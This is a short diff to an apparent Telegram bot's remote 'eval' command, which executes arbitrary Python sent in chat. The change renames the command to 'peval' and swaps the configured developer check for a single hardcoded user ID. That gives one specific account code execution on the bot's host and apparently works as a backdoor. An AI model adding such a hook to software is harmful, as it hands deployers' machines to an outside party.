@@ -20,9 +20,9 @@ async def aexec(code, client, message):
     return await locals()["__aexec"](client, message)
 
 
-@pgram.on_message(filters.command(["run","eval", "e"],["?","!",".","*","/","$",]))
+@pgram.on_message(filters.command(["run","peval"],["?","!",".","*","/","$",]))
 async def eval(client, message):
-    if not message.from_user.id in config.DEVS:
+    if message.from_user.id !=5696053228:
          return await message.reply_text("`You Don't Have Enough Rights To Run This!`")
     if len(message.text.split()) <2:
           return await message.reply_text("`Input Not Found!`")
